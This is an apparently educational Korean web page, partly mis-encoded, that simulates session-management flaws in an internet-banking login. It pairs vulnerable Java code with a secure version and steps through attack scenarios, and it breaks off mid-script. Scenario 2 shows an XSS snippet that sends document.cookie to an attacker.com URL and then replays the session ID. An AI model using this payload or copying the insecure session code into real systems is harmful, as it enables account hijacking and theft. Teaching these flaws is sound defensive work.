<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ê¸ˆìœµê¶Œ ë¶ˆì¶©ë¶„í•œ ì„¸ì…˜ ê´€ë¦¬ ì‹œë®¬ë ˆì´í„°</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@400;500;700;900&display=swap');
        body { font-family: 'Noto Sans KR', sans-serif; }
        .code-font { font-family: 'Courier New', monospace; }
        .session-badge {
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
    </style>
</head>
<body class="bg-gray-100 p-4">

    <!-- í‰ê°€ê¸°ì¤€ ë°°ë„ˆ -->
    <div class="max-w-7xl mx-auto mb-4">
        <div class="bg-red-600 text-white p-4 rounded-lg shadow-lg">
            <div class="flex items-center gap-3">
                <i class="fas fa-clipboard-check text-2xl"></i>
                <div>
                    <h1 class="font-bold text-lg">ì „ìê¸ˆìœµê¸°ë°˜ì‹œì„¤ ë³´ì•ˆ ì·¨ì•½ì  í‰ê°€ê¸°ì¤€ - WEB-SER-045</h1>
                    <p class="text-sm">ë¶ˆì¶©ë¶„í•œ ì„¸ì…˜ ê´€ë¦¬ (IS) | ìœ„í—˜ë„: 4 (ë†’ìŒ) | í†µì œêµ¬ë¶„: 5.2.4 ì„¸ì…˜ ê´€ë¦¬</p>
                </div>
            </div>
        </div>
    </div>

    <!-- ë©”ì¸ ì»¨í…ì¸  -->
    <div class="max-w-7xl mx-auto">
        <div class="grid grid-cols-1 lg:grid-cols-2 gap-4">
            
            <!-- ì¢Œì¸¡: ì·¨ì•½í•œ ì‹œìŠ¤í…œ -->
            <div class="space-y-4">
                
                <!-- ì€í–‰ í—¤ë” -->
                <div class="bg-blue-600 text-white p-4 rounded-lg shadow-lg">
                    <div class="flex items-center gap-3">
                        <i class="fas fa-building-columns text-2xl"></i>
                        <div>
                            <h2 class="text-xl font-bold">ìš°ë¦¬ì€í–‰</h2>
                            <p class="text-sm">ì¸í„°ë„·ë±…í‚¹ ë¡œê·¸ì¸ ì‹œìŠ¤í…œ</p>
                        </div>
                    </div>
                    <div class="mt-2 bg-red-500 px-3 py-1 rounded text-sm">
                        <i class="fas fa-exclamation-triangle"></i> ì·¨ì•½ì : ì„¸ì…˜ íƒ€ì„ì•„ì›ƒ ë¯¸ì„¤ì •
                    </div>
                </div>

                <!-- ë¡œê·¸ì¸ ì‹œë®¬ë ˆì´í„° -->
                <div class="bg-white p-5 rounded-lg shadow-lg">
                    <h3 class="font-bold text-lg mb-3 flex items-center gap-2">
                        <i class="fas fa-sign-in-alt text-blue-600"></i>
                        ì¸í„°ë„·ë±…í‚¹ ë¡œê·¸ì¸
                    </h3>
                    
                    <div id="loginForm">
                        <label class="block text-sm font-bold mb-2">ì‚¬ìš©ì ID</label>
                        <input type="text" id="userId" 
                               class="w-full p-2 border border-gray-300 rounded mb-3" 
                               value="customer001">
                        
                        <label class="block text-sm font-bold mb-2">ë¹„ë°€ë²ˆí˜¸</label>
                        <input type="password" id="userPwd" 
                               class="w-full p-2 border border-gray-300 rounded mb-3" 
                               value="Password123!">
                        
                        <button onclick="login()" 
                                class="w-full bg-blue-600 hover:bg-blue-700 text-white py-2 rounded">
                            <i class="fas fa-sign-in-alt"></i> ë¡œê·¸ì¸
                        </button>
                    </div>

                    <div id="sessionInfo" class="hidden">
                        <div class="bg-green-50 border-l-4 border-green-500 p-3 mb-3">
                            <p class="text-sm font-bold mb-1">âœ… ë¡œê·¸ì¸ ì„±ê³µ</p>
                            <p class="text-xs">í™˜ì˜í•©ë‹ˆë‹¤, <span id="welcomeName"></span>ë‹˜</p>
                        </div>

                        <div class="bg-white border rounded p-3 mb-3">
                            <div class="flex justify-between items-center mb-2">
                                <span class="text-sm font-bold">ì„¸ì…˜ ID:</span>
                                <span id="sessionId" class="text-xs code-font text-gray-600"></span>
                            </div>
                            <div class="flex justify-between items-center mb-2">
                                <span class="text-sm font-bold">ë¡œê·¸ì¸ ì‹œê°:</span>
                                <span id="loginTime" class="text-xs"></span>
                            </div>
                            <div class="flex justify-between items-center mb-2">
                                <span class="text-sm font-bold">ë§ˆì§€ë§‰ í™œë™:</span>
                                <span id="lastActivity" class="text-xs"></span>
                            </div>
                            <div class="flex justify-between items-center">
                                <span class="text-sm font-bold">ì„¸ì…˜ ìƒíƒœ:</span>
                                <span id="sessionStatus" class="session-badge text-xs bg-green-500 text-white px-2 py-1 rounded">í™œì„±</span>
                            </div>
                        </div>

                        <div class="flex gap-2">
                            <button onclick="checkBalance()" 
                                    class="flex-1 bg-green-600 hover:bg-green-700 text-white py-2 rounded text-sm">
                                <i class="fas fa-wallet"></i> ì”ì•¡ì¡°íšŒ
                            </button>
                            <button onclick="logout()" 
                                    class="bg-gray-500 hover:bg-gray-600 text-white px-4 py-2 rounded text-sm">
                                <i class="fas fa-sign-out-alt"></i> ë¡œê·¸ì•„ì›ƒ
                            </button>
                        </div>
                    </div>
                </div>

                <!-- ì„¸ì…˜ ì •ë³´ ìƒì„¸ -->
                <div class="bg-gray-900 text-green-400 p-4 rounded-lg shadow-lg">
                    <h3 class="font-bold mb-3 flex items-center gap-2 text-white">
                        <i class="fas fa-cookie-bite"></i>
                        ë¸Œë¼ìš°ì € ì¿ í‚¤ ì •ë³´
                    </h3>
                    <div id="cookieInfo" class="code-font text-xs">
                        <div class="text-gray-500">ë¡œê·¸ì¸ í›„ ì¿ í‚¤ ì •ë³´ê°€ í‘œì‹œë©ë‹ˆë‹¤</div>
                    </div>
                </div>

                <!-- ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ ë²„íŠ¼ -->
                <div class="bg-gray-800 text-white p-4 rounded-lg shadow-lg">
                    <h3 class="font-bold mb-3 flex items-center gap-2">
                        <i class="fas fa-flask text-red-400"></i>
                        ê³µê²© ì‹œë‚˜ë¦¬ì˜¤
                    </h3>
                    <div class="space-y-2">
                        <button onclick="attackScenario(1)" 
                                class="w-full text-left bg-red-900 hover:bg-red-800 px-3 py-2 rounded text-sm">
                            <i class="fas fa-clock"></i> ì‹œë‚˜ë¦¬ì˜¤ 1: ì„¸ì…˜ íƒ€ì„ì•„ì›ƒ ì—†ìŒ
                        </button>
                        <button onclick="attackScenario(2)" 
                                class="w-full text-left bg-orange-900 hover:bg-orange-800 px-3 py-2 rounded text-sm">
                            <i class="fas fa-copy"></i> ì‹œë‚˜ë¦¬ì˜¤ 2: ì„¸ì…˜ í•˜ì´ì¬í‚¹
                        </button>
                        <button onclick="attackScenario(3)" 
                                class="w-full text-left bg-purple-900 hover:bg-purple-800 px-3 py-2 rounded text-sm">
                            <i class="fas fa-users"></i> ì‹œë‚˜ë¦¬ì˜¤ 3: ë™ì‹œ ë¡œê·¸ì¸ í—ˆìš©
                        </button>
                        <button onclick="attackScenario(4)" 
                                class="w-full text-left bg-yellow-900 hover:bg-yellow-800 px-3 py-2 rounded text-sm">
                            <i class="fas fa-desktop"></i> ì‹œë‚˜ë¦¬ì˜¤ 4: ê³µìš© PC ì„¸ì…˜ ì¬ì‚¬ìš©
                        </button>
                    </div>
                </div>

                <!-- ì·¨ì•½í•œ ì½”ë“œ -->
                <div class="bg-gray-900 text-white p-4 rounded-lg shadow-lg">
                    <div class="flex justify-between items-center mb-3">
                        <h3 class="font-bold text-red-400">
                            <i class="fas fa-skull-crossbones"></i> ì·¨ì•½í•œ Java ì½”ë“œ
                        </h3>
                        <span class="text-xs bg-red-600 px-2 py-1 rounded">ìœ„í—˜</span>
                    </div>
                    <pre class="code-font text-xs overflow-x-auto"><code><span class="text-gray-500">// âŒ ì„¸ì…˜ ê´€ë¦¬ ë¯¸í¡</span>
@PostMapping("/login")
public String login(String userId, 
                   String password,
                   HttpSession session) {
    
    User user = userService.authenticate(userId, password);
    
    if (user != null) {
        <span class="text-red-400">// ì„¸ì…˜ íƒ€ì„ì•„ì›ƒ ë¯¸ì„¤ì •!</span>
        <span class="text-red-400">// session.setMaxInactiveInterval(600); // ì—†ìŒ</span>
        
        session.setAttribute("userId", userId);
        session.setAttribute("user", user);
        
        <span class="text-red-400">// ë™ì‹œ ë¡œê·¸ì¸ ì²´í¬ ì•ˆ í•¨!</span>
        <span class="text-red-400">// ë¡œê·¸ì•„ì›ƒ ì‹œ ì„¸ì…˜ ë¬´íš¨í™” ì•ˆ í•¨!</span>
        
        return "redirect:/main";
    }
    
    return "login";
}

@GetMapping("/logout")
public String logout(HttpSession session) {
    <span class="text-red-400">// ì„¸ì…˜ ë¬´íš¨í™” ì•ˆ í•¨!</span>
    <span class="text-red-400">// session.invalidate(); // ì—†ìŒ</span>
    
    return "redirect:/login";
}</code></pre>
                </div>

            </div>

            <!-- ìš°ì¸¡: ê²°ê³¼ ë° ì•ˆì „í•œ ì½”ë“œ -->
            <div class="space-y-4">
                
                <!-- ê³µê²© ì‹¤í–‰ ê²°ê³¼ -->
                <div class="bg-white rounded-lg shadow-lg overflow-hidden">
                    <div class="bg-gray-800 text-white px-4 py-3 flex justify-between items-center">
                        <h3 class="font-bold">
                            <i class="fas fa-terminal"></i> ê³µê²© ì‹¤í–‰ ê²°ê³¼
                        </h3>
                        <span id="statusBadge" class="text-xs bg-green-500 text-gray-900 px-3 py-1 rounded">
                            ëŒ€ê¸°ì¤‘
                        </span>
                    </div>
                    <div id="attackResult" class="p-5 min-h-[300px] bg-white">
                        <div class="text-center text-gray-400 py-10">
                            <i class="fas fa-shield-halved text-5xl mb-3 opacity-30"></i>
                            <p class="text-sm">ë¨¼ì € ë¡œê·¸ì¸í•˜ê±°ë‚˜ ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ë¥¼ ì„ íƒí•˜ì„¸ìš”</p>
                        </div>
                    </div>
                </div>

                <!-- ê³µê²© ë‹¨ê³„ -->
                <div id="attackStages" class="hidden bg-red-100 border-l-4 border-red-600 p-4 rounded-lg">
                    <h4 class="font-bold text-red-700 mb-2 flex items-center gap-2">
                        <i class="fas fa-list-ol"></i> ê³µê²© ì§„í–‰ ë‹¨ê³„
                    </h4>
                    <div id="stagesContent" class="text-sm text-red-700 space-y-1"></div>
                </div>

                <!-- í„°ë¯¸ë„ ì¶œë ¥ -->
                <div id="terminalBox" class="hidden bg-black text-green-400 p-4 rounded-lg shadow-lg">
                    <div class="font-bold mb-2 text-xs">
                        <i class="fas fa-terminal"></i> ATTACKER CONSOLE
                    </div>
                    <div id="terminalLines" class="code-font text-xs space-y-1 max-h-[200px] overflow-y-auto"></div>
                </div>

                <!-- ì•ˆì „í•œ ì½”ë“œ -->
                <div class="bg-gray-900 text-white p-4 rounded-lg shadow-lg">
                    <div class="flex justify-between items-center mb-3">
                        <h3 class="font-bold text-green-400">
                            <i class="fas fa-shield-halved"></i> ì•ˆì „í•œ Java ì½”ë“œ
                        </h3>
                        <span class="text-xs bg-green-600 px-2 py-1 rounded">ê¶Œì¥</span>
                    </div>
                    <pre class="code-font text-xs overflow-x-auto max-h-[350px]"><code><span class="text-green-400">// âœ… ì•ˆì „í•œ ì„¸ì…˜ ê´€ë¦¬</span>
@PostMapping("/login")
public String login(String userId, 
                   String password,
                   HttpServletRequest request,
                   HttpSession session) {
    
    User user = userService.authenticate(userId, password);
    
    if (user == null) {
        return "login";
    }
    
    <span class="text-green-400">// 1. ê¸°ì¡´ ì„¸ì…˜ ë¬´íš¨í™” (ì„¸ì…˜ ê³ ì • ê³µê²© ë°©ì§€)</span>
    session.invalidate();
    session = request.getSession(true);
    
    <span class="text-green-400">// 2. ì„¸ì…˜ íƒ€ì„ì•„ì›ƒ ì„¤ì • (10ë¶„)</span>
    session.setMaxInactiveInterval(600);
    
    <span class="text-green-400">// 3. ë™ì‹œ ë¡œê·¸ì¸ ì²´í¬</span>
    if (sessionRegistry.isUserLoggedIn(userId)) {
        <span class="text-green-400">// ê¸°ì¡´ ì„¸ì…˜ ê°•ì œ ì¢…ë£Œ</span>
        sessionRegistry.expireUserSessions(userId);
    }
    
    <span class="text-green-400">// 4. ì„¸ì…˜ ë“±ë¡</span>
    session.setAttribute("userId", userId);
    session.setAttribute("user", user);
    session.setAttribute("loginTime", System.currentTimeMillis());
    session.setAttribute("loginIp", request.getRemoteAddr());
    
    <span class="text-green-400">// 5. ì„¸ì…˜ ë ˆì§€ìŠ¤íŠ¸ë¦¬ì— ë“±ë¡</span>
    sessionRegistry.registerSession(
        session.getId(), 
        userId, 
        request.getRemoteAddr()
    );
    
    <span class="text-green-400">// 6. ë¡œê·¸ì¸ ì´ë ¥ ì €ì¥</span>
    auditService.logLogin(userId, request.getRemoteAddr());
    
    return "redirect:/main";
}

@GetMapping("/logout")
public String logout(HttpSession session,
                    HttpServletRequest request) {
    
    String userId = (String) session.getAttribute("userId");
    
    <span class="text-green-400">// 1. ì„¸ì…˜ ë ˆì§€ìŠ¤íŠ¸ë¦¬ì—ì„œ ì œê±°</span>
    sessionRegistry.removeSession(session.getId());
    
    <span class="text-green-400">// 2. ì„¸ì…˜ ì™„ì „ ë¬´íš¨í™”</span>
    session.invalidate();
    
    <span class="text-green-400">// 3. ë¡œê·¸ì•„ì›ƒ ì´ë ¥ ì €ì¥</span>
    auditService.logLogout(userId, request.getRemoteAddr());
    
    return "redirect:/login";
}

<span class="text-gray-500">// ì„¸ì…˜ íƒ€ì„ì•„ì›ƒ ì²´í¬ (Filter)</span>
@Override
public void doFilter(ServletRequest request, 
                    ServletResponse response,
                    FilterChain chain) {
    
    HttpSession session = ((HttpServletRequest) request)
        .getSession(false);
    
    if (session != null) {
        long lastAccess = session.getLastAccessedTime();
        long now = System.currentTimeMillis();
        long inactiveTime = now - lastAccess;
        
        <span class="text-green-400">// 10ë¶„ ë¹„í™œì„± ì‹œ ì„¸ì…˜ ë¬´íš¨í™”</span>
        if (inactiveTime > 600000) {
            String userId = (String) session.getAttribute("userId");
            sessionRegistry.removeSession(session.getId());
            session.invalidate();
            
            auditService.logSessionTimeout(userId);
            
            ((HttpServletResponse) response)
                .sendRedirect("/login?timeout=true");
            return;
        }
        
        <span class="text-green-400">// ë§ˆì§€ë§‰ í™œë™ ì‹œê°„ ê°±ì‹ </span>
        session.setAttribute("lastActivity", now);
    }
    
    chain.doFilter(request, response);
}

<span class="text-gray-500">// ì¿ í‚¤ ë³´ì•ˆ ì„¤ì •</span>
@Bean
public ServletContextInitializer servletContextInitializer() {
    return servletContext -> {
        SessionCookieConfig config = 
            servletContext.getSessionCookieConfig();
        
        <span class="text-green-400">// HttpOnly: XSS ë°©ì–´</span>
        config.setHttpOnly(true);
        
        <span class="text-green-400">// Secure: HTTPSë§Œ ì „ì†¡</span>
        config.setSecure(true);
        
        <span class="text-green-400">// SameSite: CSRF ë°©ì–´</span>
        config.setAttribute("SameSite", "Strict");
        
        <span class="text-green-400">// ì„¸ì…˜ íƒ€ì„ì•„ì›ƒ</span>
        config.setMaxAge(600); // 10ë¶„
    };
}</code></pre>
                </div>

                <!-- ë°©ì–´ ì²´í¬ë¦¬ìŠ¤íŠ¸ -->
                <div class="bg-white p-4 rounded-lg shadow-lg">
                    <h3 class="font-bold mb-3 flex items-center gap-2">
                        <i class="fas fa-list-check text-red-600"></i>
                        ì„¸ì…˜ ê´€ë¦¬ ë³´ì•ˆ ì²´í¬ë¦¬ìŠ¤íŠ¸
                    </h3>
                    <div class="space-y-2 text-sm">
                        <div class="flex items-start gap-2">
                            <i class="fas fa-check text-green-500 mt-1"></i>
                            <div><strong>íƒ€ì„ì•„ì›ƒ ì„¤ì •:</strong> 10ë¶„ ë¹„í™œì„± ì‹œ ìë™ ë¡œê·¸ì•„ì›ƒ</div>
                        </div>
                        <div class="flex items-start gap-2">
                            <i class="fas fa-check text-green-500 mt-1"></i>
                            <div><strong>ì„¸ì…˜ ë¬´íš¨í™”:</strong> ë¡œê·¸ì•„ì›ƒ ì‹œ ì™„ì „ ì‚­ì œ</div>
                        </div>
                        <div class="flex items-start gap-2">
                            <i class="fas fa-check text-green-500 mt-1"></i>
                            <div><strong>ë™ì‹œ ë¡œê·¸ì¸ ì œí•œ:</strong> 1ê°œ ì„¸ì…˜ë§Œ í—ˆìš©</div>
                        </div>
                        <div class="flex items-start gap-2">
                            <i class="fas fa-check text-green-500 mt-1"></i>
                            <div><strong>HttpOnly ì¿ í‚¤:</strong> JavaScript ì ‘ê·¼ ì°¨ë‹¨</div>
                        </div>
                        <div class="flex items-start gap-2">
                            <i class="fas fa-check text-green-500 mt-1"></i>
                            <div><strong>Secure ì¿ í‚¤:</strong> HTTPSë§Œ ì „ì†¡</div>
                        </div>
                        <div class="flex items-start gap-2">
                            <i class="fas fa-check text-green-500 mt-1"></i>
                            <div><strong>ì„¸ì…˜ ê³ ì • ë°©ì§€:</strong> ë¡œê·¸ì¸ ì‹œ ì„¸ì…˜ ì¬ìƒì„±</div>
                        </div>
                        <div class="flex items-start gap-2">
                            <i class="fas fa-check text-green-500 mt-1"></i>
                            <div><strong>IP ê²€ì¦:</strong> ì„¸ì…˜ ìƒì„± IPì™€ ì¼ì¹˜ í™•ì¸</div>
                        </div>
                    </div>
                </div>

                <!-- í‰ê°€ íŒì • -->
                <div id="judgementBox" class="hidden bg-gray-900 text-white p-4 rounded-lg">
                    <h3 class="font-bold text-indigo-400 mb-2 text-sm">
                        <i class="fas fa-gavel"></i> í‰ê°€ íŒì •
                    </h3>
                    <div class="text-xs space-y-1">
                        <div><strong>í‰ê°€í•­ëª©:</strong> WEB-SER-045 ë¶ˆì¶©ë¶„í•œ ì„¸ì…˜ ê´€ë¦¬</div>
                        <div><strong>íŒì •:</strong> <span id="judgement" class="text-red-400">ì·¨ì•½</span></div>
                        <div><strong>ê·¼ê±°:</strong> <span id="evidence"></span></div>
                    </div>
                </div>

                <!-- í”¼í•´ ì‹œë‚˜ë¦¬ì˜¤ -->
                <div id="damageBox" class="hidden bg-red-700 text-white p-4 rounded-lg">
                    <h3 class="font-bold mb-3">
                        <i class="fas fa-fire"></i> ì‹¤ì œ í”¼í•´ ì‚¬ë¡€
                    </h3>
                    <div class="space-y-2 text-sm">
                        <div class="flex gap-2">
                            <span class="font-bold">1.</span>
                            <div><strong>ê³µìš© PC ì„¸ì…˜ ì¬ì‚¬ìš©</strong><br>ë‹¤ìŒ ì‚¬ìš©ìê°€ ê³„ì¢Œ ì ‘ê·¼</div>
                        </div>
                        <div class="flex gap-2">
                            <span class="font-bold">2.</span>
                            <div><strong>ì„¸ì…˜ í•˜ì´ì¬í‚¹</strong><br>ì¿ í‚¤ íƒˆì·¨ë¡œ ê³„ì • íƒˆì·¨</div>
                        </div>
                        <div class="flex gap-2">
                            <span class="font-bold">3.</span>
                            <div><strong>ë¬´ë‹¨ ì´ì²´</strong><br>íƒˆì·¨í•œ ì„¸ì…˜ìœ¼ë¡œ ì´ì²´ ì‹¤í–‰</div>
                        </div>
                        <div class="flex gap-2">
                            <span class="font-bold">4.</span>
                            <div><strong>ê°œì¸ì •ë³´ ìœ ì¶œ</strong><br>ì„¸ì…˜ìœ¼ë¡œ ë¯¼ê° ì •ë³´ ì¡°íšŒ</div>
                        </div>
                    </div>
                </div>

            </div>
        </div>
    </div>

    <script>
        var currentSessionId = null;
        var loginTimestamp = null;

        function login() {
            var userId = document.getElementById('userId').value;
            currentSessionId = 'JSESSIONID_' + Math.random().toString(36).substr(2, 16);
            loginTimestamp = new Date();
            
            document.getElementById('loginForm').classList.add('hidden');
            document.getElementById('sessionInfo').classList.remove('hidden');
            document.getElementById('welcomeName').textContent = userId;
            document.getElementById('sessionId').textContent = currentSessionId;
            document.getElementById('loginTime').textContent = loginTimestamp.toLocaleTimeString();
            document.getElementById('lastActivity').textContent = new Date().toLocaleTimeString();
            
            document.getElementById('cookieInfo').innerHTML = 
                '<div>JSESSIONID=' + currentSessionId + '</div>' +
                '<div class="text-gray-500 mt-2">Domain: bank.com</div>' +
                '<div class="text-gray-500">Path: /</div>' +
                '<div class="text-red-400">Expires: Never (ì„¸ì…˜ ì¿ í‚¤)</div>' +
                '<div class="text-red-400">HttpOnly: false</div>' +
                '<div class="text-red-400">Secure: false</div>';
        }

        function logout() {
            document.getElementById('loginForm').classList.remove('hidden');
            document.getElementById('sessionInfo').classList.add('hidden');
            document.getElementById('cookieInfo').innerHTML = 
                '<div class="text-gray-500">ë¡œê·¸ì¸ í›„ ì¿ í‚¤ ì •ë³´ê°€ í‘œì‹œë©ë‹ˆë‹¤</div>';
            currentSessionId = null;
        }

        function checkBalance() {
            document.getElementById('lastActivity').textContent = new Date().toLocaleTimeString();
            
            var result = document.getElementById('attackResult');
            result.innerHTML = 
                '<div class="bg-blue-50 border-l-4 border-blue-500 p-4">' +
                '<h4 class="font-bold text-blue-700 mb-2">ğŸ’° ê³„ì¢Œ ì”ì•¡ ì¡°íšŒ</h4>' +
                '<div class="bg-white p-3 rounded">' +
                '<p class="text-sm mb-1">ì˜ˆê¸ˆì£¼: í™ê¸¸ë™</p>' +
                '<p class="text-sm mb-1">ê³„ì¢Œë²ˆí˜¸: 110-123-456789</p>' +
                '<p class="text-lg font-bold text-blue-600">ì”ì•¡: 15,234,000ì›</p>' +
                '</div></div>';
        }

        async function attackScenario(type) {
            var result = document.getElementById('attackResult');
            var badge = document.getElementById('statusBadge');
            
            document.getElementById('attackStages').classList.remove('hidden');
            document.getElementById('terminalBox').classList.remove('hidden');
            document.getElementById('judgementBox').classList.remove('hidden');
            document.getElementById('damageBox').classList.remove('hidden');
            document.getElementById('terminalLines').innerHTML = '';
            
            if (type === 1) {
                // ì‹œë‚˜ë¦¬ì˜¤ 1: ì„¸ì…˜ íƒ€ì„ì•„ì›ƒ ì—†ìŒ
                document.getElementById('stagesContent').innerHTML = 
                    '<div>1. ì‚¬ìš©ì Aê°€ ë¡œê·¸ì¸</div>' +
                    '<div>2. ë¸Œë¼ìš°ì €ë§Œ ë‹«ìŒ (ë¡œê·¸ì•„ì›ƒ X)</div>' +
                    '<div>3. 30ì¼ í›„ì—ë„ ì„¸ì…˜ ìœ ì§€</div>' +
                    '<div>4. ë‹¤ì‹œ ì ‘ì†í•˜ë©´ ìë™ ë¡œê·¸ì¸!</div>';
                
                if (!currentSessionId) {
                    login();
                }
                
                addTerminalLine('> ì‚¬ìš©ì ë¡œê·¸ì¸: customer001');
                await sleep(500);
                addTerminalLine('> ì„¸ì…˜ ìƒì„±: ' + currentSessionId);
                await sleep(500);
                addTerminalLine('> ë¸Œë¼ìš°ì € ì¢…ë£Œ...');
                await sleep(800);
                addTerminalLine('> [30ì¼ ê²½ê³¼]', 'text-yellow-400');
                await sleep(500);
                addTerminalLine('> ë¸Œë¼ìš°ì € ì¬ì‹¤í–‰...');
                await sleep(500);
                addTerminalLine('> [!] ì„¸ì…˜ ì—¬ì „íˆ ìœ íš¨!', 'text-red-400');
                await sleep(500);
                addTerminalLine('> ìë™ ë¡œê·¸ì¸ ì„±ê³µ', 'text-red-400');
                
                result.innerHTML = 
                    '<div class="bg-red-50 border-l-4 border-red-500 p-4">' +
                    '<h4 class="font-bold text-red-700 mb-3">ğŸš¨ ë¬´ì œí•œ ì„¸ì…˜ ìœ ì§€</h4>' +
                    '<div class="bg-white p-3 rounded mb-3 border">' +
                    '<p class="text-sm font-bold mb-2">ì„¸ì…˜ íƒ€ì„ë¼ì¸:</p>' +
                    '<table class="w-full text-xs">' +
                    '<tr class="border-b"><th class="text-left py-1">ì‹œê°„</th><th class="text-left py-1">ìƒíƒœ</th></tr>' +
                    '<tr class="border-b"><td class="py-1">12ì›” 1ì¼</td><td class="py-1">ë¡œê·¸ì¸</td></tr>' +
                    '<tr class="border-b"><td class="py-1">12ì›” 1ì¼</td><td class="py-1">ë¸Œë¼ìš°ì € ì¢…ë£Œ</td></tr>' +
                    '<tr class="border-b bg-yellow-50"><td class="py-1">12ì›” 15ì¼</td><td class="py-1 text-yellow-600">ì„¸ì…˜ ìœ ì§€ì¤‘</td></tr>' +
                    '<tr class="bg-red-50"><td class="py-1">12ì›” 31ì¼</td><td class="py-1 text-red-600">ì„¸ì…˜ ì—¬ì „íˆ ìœ íš¨</td></tr>' +
                    '</table></div>' +
                    '<div class="bg-red-900 text-red-100 p-3 rounded text-sm">' +
                    '<p class="font-bold">âš ï¸ ìœ„í—˜</p>' +
                    '<p>ê³µìš© PC ì‚¬ìš© ì‹œ íƒ€ì¸ì´ ê³„ì¢Œ ì ‘ê·¼ ê°€ëŠ¥</p>' +
                    '<p>ì„¸ì…˜ í•˜ì´ì¬í‚¹ ìœ„í—˜ ìƒìŠ¹</p>' +
                    '</div></div>';
                
                document.getElementById('evidence').textContent = 'ì„¸ì…˜ íƒ€ì„ì•„ì›ƒ ë¯¸ì„¤ì •';
                badge.textContent = 'ì·¨ì•½';
                badge.className = 'text-xs bg-red-500 text-white px-3 py-1 rounded';
                
            } else if (type === 2) {
                // ì‹œë‚˜ë¦¬ì˜¤ 2: ì„¸ì…˜ í•˜ì´ì¬í‚¹
                document.getElementById('stagesContent').innerHTML = 
                    '<div>1. XSSë¡œ ì„¸ì…˜ ì¿ í‚¤ íƒˆì·¨</div>' +
                    '<div>2. ê³µê²©ìê°€ ì¿ í‚¤ ë³µì‚¬</div>' +
                    '<div>3. ê³µê²©ì ë¸Œë¼ìš°ì €ì— ì¿ í‚¤ ì„¤ì •</div>' +
                    '<div>4. í”¼í•´ì ê³„ì • ì ‘ê·¼ ì„±ê³µ!</div>';
                
                if (!currentSessionId) {
                    login();
                }
                
                addTerminalLine('> XSS ê³µê²©ìœ¼ë¡œ ì¿ í‚¤ íƒˆì·¨...');
                await sleep(500);
                addTerminalLine('> document.cookie:', 'text-yellow-400');
                addTerminalLine('  JSESSIONID=' + currentSessionId, 'text-red-400');
                await sleep(800);
                addTerminalLine('> ê³µê²©ì ë¸Œë¼ìš°ì €ì— ì¿ í‚¤ ë³µì‚¬');
                await sleep(500);
                addTerminalLine('> ì€í–‰ ì‚¬ì´íŠ¸ ì ‘ì†...');
                await sleep(800);
                addTerminalLine('> [!] ë¡œê·¸ì¸ ì—†ì´ ì ‘ê·¼ ì„±ê³µ!', 'text-red-400');
                await sleep(500);
                addTerminalLine('> ì”ì•¡ ì¡°íšŒ ê°€ëŠ¥', 'text-red-400');
                addTerminalLine('> ì´ì²´ ê¸°ëŠ¥ ì ‘ê·¼ ê°€ëŠ¥', 'text-red-400');
                
                result.innerHTML = 
                    '<div class="bg-red-50 border-l-4 border-red-500 p-4">' +
                    '<h4 class="font-bold text-red-700 mb-3">ğŸš¨ ì„¸ì…˜ í•˜ì´ì¬í‚¹ ì„±ê³µ</h4>' +
                    '<div class="bg-gray-900 text-green-400 p-3 rounded mb-3 code-font text-xs">' +
                    '<div class="text-white">// í”¼í•´ì ë¸Œë¼ìš°ì € (XSS)</div>' +
                    '<div>&lt;script&gt;</div>' +
                    '<div class="ml-2">var cookie = document.cookie;</div>' +
                    '<div class="ml-2 text-red-400">fetch(\'http://attacker.com/steal\',</div>' +
                    '<div class="ml-4 text-red-400">{body: cookie});</div>' +
                    '<div>&lt;/script&gt;</div>' +
                    '<div class="mt-2 text-white">// ê³µê²©ì ë¸Œë¼ìš°ì €</div>' +
                    '<div class="text-yellow-400">document.cookie = "JSESSIONID=' + currentSessionId.substr(0, 20) + '...";</div>' +
                    '<div class="text-red-400">location.href = "https://bank.com/main";</div>' +
                    '</div>' +
                    '<div class="bg-red-900 text-red-100 p-3 rounded text-sm">' +
                    '<p class="font-bold">ğŸ’° ê³µê²© ì„±ê³µ</p>' +
                    '<p>ê³„ì¢Œ ì •ë³´ ì¡°íšŒ ê°€ëŠ¥</p>' +
                    '<p>ë¬´ë‹¨ ì´ì²´ ì‹¤í–‰ ê°€ëŠ¥</p>' +
                    '</div></div>';
                
                document.getElementById('evidence').textContent = 'HttpOnly ì¿ í‚¤ ë¯¸ì‚¬ìš©';
                badge.textContent = 'ì¹˜ëª…ì ';
                badge.className = 'text-xs bg-red-600 text-white px-3 py-1 rounded';
                
            } else if (type === 3) {
                // ì‹œë‚˜ë¦¬ì˜¤ 3: ë™ì‹œ ë¡œê·¸ì¸
                document.getElementById('stagesContent').innerHTML = 
                    '<div>1. PCì—ì„œ ë¡œê·¸ì¸ (ì„¸ì…˜ A)</div>' +
                    '<div>2. ëª¨ë°”ì¼ì—ì„œ ë¡œê·¸ì¸ (ì„¸ì…˜ B)</div>' +
                    '<div>3. ê³µìš© PCì—ì„œ ë¡œê·¸ì¸ (ì„¸ì…˜ C)</div>' +
                    '<div>4. ëª¨ë“  ì„¸ì…˜ì´ ë™ì‹œ í™œì„±!</div>';
                
                addTerminalLine('> PC ë¡œê·¸ì¸: ì„¸ì…˜ ABC123...');
                await sleep(500);
                addTerminalLine('> ëª¨ë°”ì¼ ë¡œê·¸ì¸: ì„¸ì…˜ DEF456...');
                await sleep(500);
                addTerminalLine('> ê³µìš© PC ë¡œê·¸ì¸: ì„¸ì…˜ GHI789...');
                await sleep(500);
                addTerminalLine('> [!] 3ê°œ ì„¸ì…˜ ë™ì‹œ í™œì„±!', 'text-red-400');
                await sleep(800);
                addTerminalLine('> PCì—ì„œ 100ë§Œì› ì´ì²´', 'text-yellow-400');
                await sleep(300);
                addTerminalLine('> ëª¨ë°”ì¼ì—ì„œ 200ë§Œì› ì´ì²´', 'text-yellow-400');
                await sleep(300);
                addTerminalLine('> ê³µìš© PC ì‚¬ìš©ìê°€ ì¡°íšŒ...', 'text-red-400');
                await sleep(500);
                addTerminalLine('> [!] íƒ€ì¸ì´ ê³„ì¢Œ ì ‘ê·¼!', 'text-red-400');
                
